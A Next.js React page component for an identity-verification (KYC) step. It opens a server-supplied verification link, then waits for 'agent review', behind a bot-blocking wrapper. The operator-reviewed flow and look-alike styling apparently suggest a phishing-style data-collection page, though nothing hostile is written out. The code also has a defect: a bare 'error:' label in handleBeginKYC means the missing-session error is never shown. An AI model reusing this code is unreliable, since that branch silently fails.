'use client';

import { useState, useEffect } from 'react';
import { useSessionStore } from '@shared';
import { BotGuard } from '@/components/security/BotGuard';
import { Sidebar } from '@/components/layout/Sidebar';
import Image from 'next/image';

export default function KYCPage() {
  const { status, caseId, agentMessage } = useSessionStore();
  const [kycStatus, setKycStatus] = useState<'not_started' | 'in_progress' | 'waiting'>('not_started');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setKycStatus('not_started');
      setError(agentMessage || 'Your submission was rejected. Please try again.');
    }
  }, [status, agentMessage]);

  async function handleBeginKYC() {
    if (!caseId) { error: 'Session information missing'; return; }

    try {
      const response = await fetch('/api/user-started-kyc', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ case_id: caseId }),
      });

      if (!response.ok) throw new Error('Failed to start process');

      const data = await response.json();
      const kycUrl = data.kyc_url;

      if (!kycUrl) throw new Error('Configuration error');

      window.open(kycUrl, '_blank');
      setKycStatus('in_progress');
      setError(null);
    } catch (err) {
      console.error('KYC begin error:', err);
      setError('Unable to start verification. Please try again.');
    }
  }

  async function handleKYCCompleted() {
    if (!caseId) return;
    setIsLoading(true);
    setError(null);

    try {
      const response = await fetch('/api/submit-kyc', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ case_id: caseId }),
      });

      if (!response.ok) throw new Error('Failed to submit');

      setKycStatus('waiting');
      useSessionStore.setState({
        status: 'waiting',
        agentMessage: 'KYC submitted. Waiting for agent review...',
      });
    } catch (err) {
      setError('Failed to submit. Please try again.');
    } finally {
      setIsLoading(false);
    }
  }

  const handleRetry = () => {
    setError(null);
    setKycStatus('not_started');
  };

  const renderContent = () => {
    if (kycStatus === 'waiting' || status === 'waiting') {
      return (
        <div className="p-4 text-center">
          <h3 className="text-lg font-bold mb-2">Verification Submitted</h3>
          <p className="text-sm">Your information is being reviewed. This may take a few moments.</p>
        </div>
      );
    }

    if (kycStatus === 'in_progress') {
      return (
        <div className="p-[8px]">
          <p className="text-[12px] mb-4 p-2">
            Please complete the verification in the new tab that opened.
            When finished, return here and click below.
          </p>
          {error && <div className="text-red-600 text-[12px] mb-2 px-2">{error}</div>}
          <div className="p-[12px] pb-[8px] px-[8px] border-t border-[#d5d5d5] mt-[4px] overflow-hidden">
            <div className="float-left inline-flex items-center h-[24px] bg-[#00baef] rounded-[12px] pr-[8px]">
              <span className="flex items-center">
                <button
                  onClick={handleKYCCompleted}
                  disabled={isLoading}
                  className="bg-transparent border-0 text-white font-[400] text-[12px] h-[24px] pl-[12px] pr-[2px] cursor-pointer hover:underline focus:outline-none whitespace-nowrap font-sans"
                >
                  {isLoading ? 'Submitting...' : "I've Completed Verification"}
                </button>
              </span>
              <span className="w-[20px] h-[20px] ml-[8px] bg-[url('/bg-padlock-sprite.png')] bg-no-repeat bg-[length:20px_auto] bg-[0_0]"></span>
            </div>

            {/* Start Over Button */}
            {!isLoading && (
              <button
                onClick={handleRetry}
                className="float-left ml-[12px] leading-[24px] text-[12px] text-[#009de5] hover:underline bg-transparent border-0 cursor-pointer font-sans"
              >
                Start over
              </button>
            )}
          </div>
        </div>
      );
    }

    return (
      <div className="p-[8px]">
        <p className="text-[12px] mb-4 p-2">
          To ensure your security, we need to verify your identity with our trusted partner.
        </p>
        {error && <div className="text-red-600 text-[12px] mb-2 px-2">{error}</div>}
        <div className="p-[12px] pb-[8px] px-[8px] border-t border-[#d5d5d5] mt-[4px] overflow-hidden">
          <div className="float-left inline-flex items-center h-[24px] bg-[#00baef] rounded-[12px] pr-[8px]">
            <span className="flex items-center">
              <button
                onClick={handleBeginKYC}
                className="bg-transparent border-0 text-white font-[400] text-[12px] h-[24px] pl-[12px] pr-[2px] cursor-pointer hover:underline focus:outline-none whitespace-nowrap font-sans"
              >
                Begin Verification
              </button>
            </span>
            <span className="w-[20px] h-[20px] ml-[8px] bg-[url('/bg-padlock-sprite.png')] bg-no-repeat bg-[length:20px_auto] bg-[0_0]"></span>
          </div>
        </div>
      </div>
    );
  };

  return (
    <BotGuard>
      <div className="flex gap-[30px] items-start pt-[20px] pb-[40px] max-w-[957px] px-[18px] mx-auto md:flex-row flex-col text-[#333]">
        {/* Left Column */}
        <div className="flex-1 w-full max-w-[730px]">
          <h1 className="text-[36px] font-[500] text-black mb-[20px] pl-[8px] leading-[44px]">Identity Verification</h1>

          {/* Card */}
          <div className="bg-[#f2f2f2] w-full">
            <fieldset className="w-full border-0 p-0 m-0">
              <legend className="w-full bg-gradient-to-b from-[#f0f0f0] to-[#dedede] border-b border-[#969696] px-[8px] py-[6px] text-[14px] font-bold text-[#34423e] block mb-0 font-sans">Verify your identity</legend>
              {renderContent()}
            </fieldset>
          </div>
        </div>

        {/* Right Sidebar */}
        <Sidebar />
      </div>
    </BotGuard>
  );
}
